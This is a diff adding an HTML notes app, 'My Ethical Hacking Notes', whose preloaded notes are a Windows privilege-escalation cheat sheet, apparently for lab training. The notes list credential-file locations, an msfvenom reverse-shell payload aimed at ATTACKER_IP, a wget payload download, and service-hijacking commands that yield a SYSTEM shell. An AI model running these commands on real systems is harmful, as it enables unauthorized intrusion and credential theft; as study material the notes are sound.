@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>My Ethical Hacking Notes</title>
+  <style>
+    /* Reset & Base Styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box !important;
+    }
+    html, body {
+      width: 100%;
+      min-height: 100%;
+      background-color: #171717;
+      color: #e0e0e0; /* Lighter text for better contrast */
+      line-height: 1.6;
+      position: relative;
+      font-family: sans-serif;
+      overflow-y: auto; /* Allow scrolling */
+    }
+
+    /* Background Lines Effect */
+    .lines {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 100%;
+      width: 90vw;
+      margin: auto;
+      pointer-events: none; /* So background does not block interactions */
+    }
+    .line {
+      position: absolute;
+      width: 1px;
+      height: 100%;
+      top: 0;
+      left: 50%;
+      background: rgba(255, 255, 255, 0.1);
+      overflow: hidden;
+    }
+    .line::after {
+      content: '';
+      display: block;
+      position: absolute;
+      height: 15vh;
+      width: 100%;
+      top: -50%;
+      left: 0;
+      background: linear-gradient(to bottom, rgba(255, 255, 255, 0) 0%, #ffffff 75%, #ffffff 100%);
+      animation: drop 7s 0s infinite;
+      animation-fill-mode: forwards;
+      animation-timing-function: cubic-bezier(0.4, 0.26, 0, 0.97);
+    }
+    /* Offset adjustments for the first and third line */
+    .line:nth-child(1) {
+      margin-left: -25%;
+    }
+    .line:nth-child(1)::after {
+      animation-delay: 2s;
+    }
+    .line:nth-child(3) {
+      margin-left: 25%;
+    }
+    .line:nth-child(3)::after {
+      animation-delay: 2.5s;
+    }
+    @keyframes drop {
+      0% { top: -50%; }
+      100% { top: 110%; }
+    }
+
+    /* Main Container */
+    .container {
+      position: relative;
+      z-index: 1;
+      max-width: 800px;
+      margin: 20px auto;
+      padding: 20px;
+    }
+    h1 {
+      text-align: center;
+      color: #6a0dad; /* Purple accent */
+      text-shadow: 0 0 5px #6a0dad;
+      margin-bottom: 20px;
+    }
+    .motivation {
+      text-align: center;
+      font-size: 1.2em;
+      color: #1a3c6b; /* Secondary accent */
+      margin-bottom: 20px;
+    }
+
+    /* Note Form */
+    .note-form {
+      background: #1a1a2a;
+      padding: 20px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      border: 1px solid #1a3c6b;
+    }
+    .note-form input,
+    .note-form textarea {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      background: #171717;
+      border: 1px solid #6a0dad;
+      color: #e0e0e0;
+      border-radius: 4px;
+      font-family: inherit;
+    }
+    .note-form button {
+      background: #6a0dad;
+      color: #171717;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .note-form button:hover {
+      background: #5a0c9d;
+    }
+
+    /* Notes List */
+    .notes-container {
+      display: grid;
+      gap: 20px;
+    }
+    .note-card {
+      background: #1a1a2a;
+      border-radius: 4px;
+      border: 1px solid #6a0dad;
+      position: relative;
+      padding: 10px;
+    }
+    .note-title {
+      color: #6a0dad;
+      background: #1a1a1a;
+      padding: 10px;
+      cursor: pointer;
+      font-size: 1.2em;
+      border-bottom: 1px solid #1a3c6b;
+    }
+    .note-content {
+      color: #e0e0e0;
+      white-space: pre-wrap;
+      line-height: 1.5;
+      padding: 10px;
+      display: none;
+    }
+    .note-card.editing .note-content {
+      display: block;
+    }
+    .edit-btn, .save-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: #6a0dad;
+      color: #171717;
+      border: none;
+      padding: 5px 10px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .save-btn {
+      display: none;
+    }
+    .note-card.editing .edit-btn {
+      display: none;
+    }
+    .note-card.editing .save-btn {
+      display: block;
+    }
+    .edit-title, .edit-content {
+      width: 100%;
+      padding: 5px;
+      margin-bottom: 5px;
+      background: #171717;
+      border: 1px solid #6a0dad;
+      color: #e0e0e0;
+      border-radius: 4px;
+      font-family: inherit;
+    }
+  </style>
+</head>
+<body>
+  <!-- Background Lines -->
+  <div class="lines">
+    <div class="line"></div>
+    <div class="line"></div>
+    <div class="line"></div>
+  </div>
+
+  <!-- Main Content -->
+  <div class="container">
+    <h1>My Ethical Hacking Notes</h1>
+    <div class="motivation" id="motivation"></div>
+    <div class="note-form">
+      <form id="noteForm">
+        <input type="text" id="noteTitle" placeholder="Note Title" required>
+        <textarea id="noteContent" rows="4" placeholder="Enter your note here..." required></textarea>
+        <button type="submit">Add Note</button>
+      </form>
+    </div>
+    <div class="notes-container" id="notesContainer"></div>
+  </div>
+
+  <script>
+    // Pre-existing notes
+    const initialNotes = [
+      {
+        title: "General Cheatsheet",
+        content: `CHEATSHEET:\nhttps://swisskyrepo.github.io/InternalAllTheThings/`
+      },
+      {
+        title: "Linux Privilege Escalation",
+        content: `Resources:\n- https://gtfobins.github.io/#base\n- https://github.com/rebootuser/LinEnum\n- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/`
+      },
+      {
+        title: "Password Cracking",
+        content: `Tools:\n- https://crackstation.net\n- https://hashes.com/en/decrypt/hash`
+      },
+      {
+        title: "Windows Privilege Escalation",
+        content: `Unattended Windows Installations:\n- C:\\Unattend.xml\n- C:\\Windows\\Panther\\Unattend.xml\n- C:\\Windows\\Panther\\Unattend\\Unattend.xml\n- C:\\Windows\\system32\\sysprep.inf\n- C:\\Windows\\system32\\sysprep\\sysprep.xml\n\nPowershell History:\n- type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n\nSaved Windows Credentials:\n- cmdkey /list\n- runas /savecred /user:admin cmd.exe\n\nIIS Configuration:\n- C:\\inetpub\\wwwroot\\web.config\n- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\n\nRetrieve Credentials from Software: PuTTY:\n- reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f "Proxy" /s\n\nScheduled Tasks:\n- schtasks\n- schtasks /query /tn vulntask /fo list /v\n\nWindows Services:\n- sc qc <service name>\n- cacls <path>\n\nPayload Generation:\n- msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe\n\nTransfer Payload:\n- python3 -m http.server\n- wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe\n\nService Manipulation:\n- move <OriginalExecutable> <OriginalExecutable>.bkp\n- move rev-svc.exe <OriginalExecutable>\n- icacls <OriginalExecutable> /grant Everyone:F\n- sc stop <ServiceName>\n- sc start <ServiceName>\n\nExample:\nsc qc WindowsScheduler\nicacls C:\\PROGRA~2\\SYSTEM~1\\WService.exe\nmove WService.exe WService.exe.bkp\nmove rev-svc.exe WService.exe\nicacls WService.exe /grant Everyone:F\nsc stop WindowsScheduler\nsc start WindowsScheduler\n\nNote: When using a reverse shell via a service, you gain the privileges of the user authorized to run the service.`
+      },
+      {
+        title: "Unquoted Service Paths",
+        content: `When Windows looks for a file, it interprets spaces as executable boundaries.\nExample:\nC:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe\nWindows checks:\n- C:\\MyPrograms\\Disk.exe\n- C:\\MyPrograms\\Disk Sorter.exe, etc.\n\nExploit:\n- Create payload named Disk.exe\n- sc stop "disk sorter enterprise"\n- icacls C:\\MyPrograms\\Disk.exe /grant Everyone:F`
+      },
+      {
+        title: "Insecure Service Permissions",
+        content: `Check Service DACL:\n- accesschk64.exe -qlc <ServiceName>\n- Look for BUILTIN\\Users with SERVICE_ALL_ACCESS\n\nGenerate Payload:\n- msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f exe-service -o rev-svc3.exe\n\nTransfer and Prepare:\n- icacls C:\\Users\\thm-unpriv\\rev-svc3.exe /grant Everyone:F\n\nReconfigure Service:\n- sc config <ServiceName> binPath= "C:\\Users\\thm-unpriv\\rev-svc3.exe" obj= LocalSystem\n\nRestart Service:\n- sc stop <ServiceName>\n- sc start <ServiceName>\n\nResult:\n- Gain SYSTEM shell: whoami (NT AUTHORITY\\SYSTEM)`
+      }
+    ];
+
+    // Daily motivational quotes
+    const quotes = [
+      "Stay hungry, stay foolish.",
+      "The only way to do great work is to love what you do.",
+      "Innovation distinguishes between a leader and a follower.",
+      "Your time is limited, don't waste it living someone else's life.",
+      "Design is not just what it looks like and feels like. Design is how it works."
+    ];
+    const motivationElem = document.getElementById('motivation');
+    const today = new Date().getDate();
+    const quote = quotes[today % quotes.length];
+    let i = 0;
+    function typeWriter() {
+      if (i < quote.length) {
+        motivationElem.textContent += quote.charAt(i);
+        i++;
+        setTimeout(typeWriter, 50);
+      }
+    }
+    typeWriter();
+
+    // Load notes from localStorage or use defaults
+    let notes = JSON.parse(localStorage.getItem('notes')) || initialNotes;
+    function saveNotes() {
+      localStorage.setItem('notes', JSON.stringify(notes));
+    }
+
+    // Render notes safely by creating elements and setting textContent
+    function displayNotes() {
+      const notesContainer = document.getElementById('notesContainer');
+      notesContainer.innerHTML = '';
+      notes.forEach((note, index) => {
+        const noteCard = document.createElement('div');
+        noteCard.className = 'note-card';
+
+        const noteTitle = document.createElement('div');
+        noteTitle.className = 'note-title';
+        noteTitle.textContent = note.title;
+        noteTitle.addEventListener('click', () => toggleContent(index));
+
+        const noteContent = document.createElement('div');
+        noteContent.className = 'note-content';
+        noteContent.id = `content-${index}`;
+        noteContent.textContent = note.content;
+
+        const editBtn = document.createElement('button');
+        editBtn.className = 'edit-btn';
+        editBtn.textContent = 'Edit';
+        editBtn.addEventListener('click', () => editNote(index));
+
+        const saveBtn = document.createElement('button');
+        saveBtn.className = 'save-btn';
+        saveBtn.textContent = 'Save';
+        saveBtn.addEventListener('click', () => saveNote(index));
+
+        noteCard.append(noteTitle, noteContent, editBtn, saveBtn);
+        notesContainer.appendChild(noteCard);
+      });
+    }
+
+    // Toggle note content visibility
+    function toggleContent(index) {
+      const contentElem = document.getElementById(`content-${index}`);
+      contentElem.style.display = contentElem.style.display === 'block' ? 'none' : 'block';
+    }
+
+    // Enable editing a note by replacing text with input fields
+    function editNote(index) {
+      const notesContainer = document.getElementById('notesContainer');
+      const noteCard = notesContainer.children[index];
+      noteCard.classList.add('editing');
+
+      const noteTitle = noteCard.querySelector('.note-title');
+      const noteContent = noteCard.querySelector('.note-content');
+
+      const titleInput = document.createElement('input');
+      titleInput.type = 'text';
+      titleInput.className = 'edit-title';
+      titleInput.value = notes[index].title;
+      noteTitle.textContent = '';
+      noteTitle.appendChild(titleInput);
+
+      const contentTextarea = document.createElement('textarea');
+      contentTextarea.className = 'edit-content';
+      contentTextarea.rows = 4;
+      contentTextarea.value = notes[index].content;
+      noteContent.textContent = '';
+      noteContent.appendChild(contentTextarea);
+    }
+
+    // Save the edited note
+    function saveNote(index) {
+      const notesContainer = document.getElementById('notesContainer');
+      const noteCard = notesContainer.children[index];
+      const titleInput = noteCard.querySelector('.edit-title');
+      const contentTextarea = noteCard.querySelector('.edit-content');
+      notes[index].title = titleInput.value;
+      notes[index].content = contentTextarea.value;
+      saveNotes();
+      displayNotes();
+    }
+
+    // Handle new note submission
+    const noteForm = document.getElementById('noteForm');
+    noteForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const title = document.getElementById('noteTitle').value.trim();
+      const content = document.getElementById('noteContent').value.trim();
+      if (title && content) {
+        notes.push({ title, content });
+        saveNotes();
+        displayNotes();
+        noteForm.reset();
+      }
+    });
+
+    // Initial display
+    displayNotes();
+  </script>
+</body>
+</html>
